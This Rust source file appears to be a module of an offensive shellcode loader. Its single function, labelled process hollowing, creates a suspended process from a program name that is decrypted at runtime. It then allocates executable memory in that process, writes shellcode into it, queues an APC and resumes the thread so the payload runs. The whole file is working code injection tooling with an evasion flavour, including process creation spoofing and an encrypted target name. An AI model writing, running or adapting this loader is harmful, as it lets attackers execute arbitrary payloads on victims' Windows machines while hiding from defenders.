use crate::api::*;
use windows_sys::Win32::System::Threading::CREATE_SUSPENDED;

#[cfg(feature = "run_process_hollowing")]
pub unsafe fn exec(shellcode_ptr: usize, shellcode_len: usize) -> Result<(), String> {
    #[cfg(feature = "debug")]
    crate::utils::print_message("Executing via Process Hollowing...");

    // Convert shellcode to payload slice
    let shellcode = std::slice::from_raw_parts(shellcode_ptr as *const u8, shellcode_len);

    use crate::utils::simple_decrypt;
    let target_program = simple_decrypt(env!("RSL_ENCRYPTED_TARGET_PROGRAM"));

    // 1. Create suspended process
    let process_info = crate::api::create_process_with_spoofing(target_program.as_str(), true)?;

    // 2. Allocate memory for shellcode
    let remote_mem = alloc_virtual_memory_at(
        process_info.hProcess,
        0,
        shellcode_len,
        PAGE_EXECUTE_READWRITE,
    )?;

    // 3. Write shellcode
    write_virtual_memory(process_info.hProcess, remote_mem, shellcode)?;

    // 4. Queue APC to execute shellcode
    queue_apc_thread(process_info.hThread, remote_mem)?;

    // 5. Resume thread to execute APC
    resume_thread(process_info.hThread)?;

    // Close handles
    close_handle(process_info.hThread);
    close_handle(process_info.hProcess);

    Ok(())
}